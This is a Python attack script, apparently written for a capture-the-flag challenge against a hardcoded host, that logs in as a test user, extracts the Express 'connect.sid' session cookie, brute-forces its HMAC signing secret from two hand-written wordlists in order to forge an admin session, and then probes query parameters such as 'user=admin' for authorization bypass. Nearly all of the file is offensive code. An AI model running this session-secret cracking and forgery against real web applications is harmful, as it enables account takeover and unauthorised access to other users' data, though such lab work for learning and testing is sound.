import requests
import re
import hashlib
import hmac
import base64
import urllib.parse
import itertools

base = 'http://154.57.164.80:31506'

# Express session cookies format:
# s:<session_id>.<signature>
# The signature is: base64(HMAC-SHA256(session_id, secret))

# Let me first get a valid session cookie
s = requests.Session()
s.post(f'{base}/login', data={'username': 'testuser1', 'password': 'testpass123'})

cookie_value = None
for c in s.cookies:
    if c.name == 'connect.sid':
        cookie_value = urllib.parse.unquote(c.value)
        break

print(f"Cookie value: {cookie_value}")

# Parse the cookie: s:<session_id>.<signature>
if cookie_value and cookie_value.startswith('s:'):
    parts = cookie_value[2:].rsplit('.', 1)
    session_id = parts[0]
    signature = parts[1] if len(parts) > 1 else ''
    print(f"Session ID: {session_id}")
    print(f"Signature: {signature}")
    
    # Try common secrets
    common_secrets = [
        'secret', 'keyboard cat', 'supersecret', 'mysecret', 'session-secret',
        'express', 'rookery', 'password', 'admin', 'changeme', 'default',
        'letmein', 'abc123', '123456', 'qwerty', 'key',
        'rookery-secret', 'the-secret', 'app-secret', 'session_secret',
        's3cr3t', 'SECRET', 'shhh', 'cookie-secret', 'my-secret',
        'development', 'test', 'production', 'node_secret',
        'raven', 'crow', 'bird', 'medieval', 'castle',
    ]
    
    for secret in common_secrets:
        # Compute HMAC-SHA256
        h = hmac.new(secret.encode(), session_id.encode(), hashlib.sha256).digest()
        computed_sig = base64.b64encode(h).decode().rstrip('=').replace('+', '-').replace('/', '_')
        
        if computed_sig == signature:
            print(f"\n*** SECRET FOUND: {secret!r} ***")
            
            # Now we need to forge an admin session
            # First, let's figure out what session data looks like
            # We need to create a session with admin's user id
            break
    else:
        print("\nSecret not found in common list. Trying more...")
        
        # Try more secrets from wordlists
        more_secrets = [
            'skeleton key', 'master key', 'golden key',
            'RookerySecret', 'rookery_secret', 'ROOKERY_SECRET',
            'app_secret', 'APP_SECRET', 'SESSION_SECRET',
            'cookie_secret', 'COOKIE_SECRET',
            'the_secret_key', 'my_secret_key',
            'a_secret_key', 'very_secret_key',
            'not_a_secret', 'this_is_secret',
            'change_me', 'please_change_me',
            'insecure', 'unsafe', 'weak',
            'seal', 'wax-seal', 'raven-post',
            'salt-crown', 'stormbound', 'eastreach',
        ]
        
        for secret in more_secrets:
            h = hmac.new(secret.encode(), session_id.encode(), hashlib.sha256).digest()
            computed_sig = base64.b64encode(h).decode().rstrip('=').replace('+', '-').replace('/', '_')
            
            if computed_sig == signature:
                print(f"\n*** SECRET FOUND: {secret!r} ***")
                break
        else:
            print("Secret still not found.")
            # Print expected vs actual for debugging
            test_secret = 'secret'
            h = hmac.new(test_secret.encode(), session_id.encode(), hashlib.sha256).digest()
            test_sig = base64.b64encode(h).decode().rstrip('=').replace('+', '-').replace('/', '_')
            print(f"\nFor secret='secret': computed={test_sig}, actual={signature}")
            print(f"Lengths: computed={len(test_sig)}, actual={len(signature)}")

# Also try approach: maybe we can use the session store directly
# Express-session with connect.sid stores in memory by default
# The session data contains: { user: { id: ..., username: '...' } }

# Let me also try manipulating the query to bypass auth
# Check if there's a way to access admin messages through some other route
print("\n=== TRYING TO ACCESS ADMIN DATA ===")
s2 = requests.Session()
s2.post(f'{base}/login', data={'username': 'testuser1', 'password': 'testpass123'})

# Try adding query parameters that might leak data  
for param in ['user=admin', 'username=admin', 'as=admin', 'userid=1', 'id=1']:
    r = s2.get(f'{base}/?{param}')
    if 'admin' in r.text and 'testuser1' not in r.text:
        print(f"  /?{param}: might have leaked admin data!")
        print(f"  Body: {r.text[:500]}")
